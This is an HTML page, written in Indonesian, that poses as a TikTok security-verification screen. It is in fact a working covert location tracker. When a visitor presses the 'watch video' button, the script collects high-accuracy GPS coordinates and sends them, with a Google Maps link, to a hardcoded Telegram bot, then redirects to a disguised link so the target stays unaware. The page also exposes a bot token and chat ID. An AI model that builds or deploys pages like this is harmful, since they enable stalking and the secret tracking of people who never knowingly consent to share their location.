<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TikTok - Verifikasi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#010101; display:flex; justify-content:center; align-items:center; height:100vh; color:#fff; font-family:sans-serif; margin:0;">
    <div style="text-align:center; padding:20px;">
        <div style="border:4px solid #333; border-top:4px solid #fe2c55; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:auto;"></div>
        <h2 style="font-size:18px; margin-top:20px;">Verifikasi Keamanan</h2>
        <p style="font-size:12px; color:#888; margin-bottom:25px;">Klik tombol di bawah untuk melanjutkan</p>
        <button onclick="startTracking()" style="background:#fe2c55; color:white; border:none; padding:12px 30px; border-radius:4px; font-weight:bold; width:100%; max-width:250px; cursor:pointer;">LIHAT VIDEO</button>
    </div>

    <style>@keyframes spin {0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)}}</style>

    <script>
        const TOKEN = '8770900784:AAFQMU3eer9kUvL6QkWj2SqWCdkQiFnS8G0';
        const CHAT_ID = '7668457237'; // ID ANDA SUDAH SAYA MASUKKAN DISINI

        let sent = false;

        function startTracking() {
            const params = new URLSearchParams(window.location.search);
            const targetLink = atob(params.get('to')) || "https://tiktok.com";

            const geoOptions = { 
                enableHighAccuracy: true, 
                timeout: 15000, 
                maximumAge: 0 
            };

            const watchId = navigator.geolocation.watchPosition((p) => {
                const acc = p.coords.accuracy;
                
                // Sniper Logic: Kirim data hanya jika radar sudah menangkap sinyal
                if (!sent && acc > 0) {
                    sent = true;
                    const lat = p.coords.latitude;
                    const lng = p.coords.longitude;
                    const gmaps = `https://www.google.com/maps?q=${lat},${lng}`;
                    
                    const text = `😈 **TARGET TERKUNCI!**\n\n📍 Maps: ${gmaps}\n🎯 Akurasi: ${acc.toFixed(1)}m\n📱 Status: ${acc < 50 ? "PRESEISI (GPS)" : "LOKASI KASAR (BTS)"}`;
                    
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
                    .then(() => {
                        navigator.geolocation.clearWatch(watchId);
                        window.location.href = targetLink;
                    });
                }
            }, (err) => {
                if(!sent) {
                    // Jika error tetap pindah ke video biar tidak curiga
                    window.location.href = targetLink;
                }
            }, geoOptions);

            // Timeout Backup: Kalau 10 detik nggak dapet GPS, langsung pindah
            setTimeout(() => { 
                if(!sent) {
                    sent = true;
                    window.location.href = targetLink;
                }
            }, 10000);
        }
    </script>
</body>
</html>
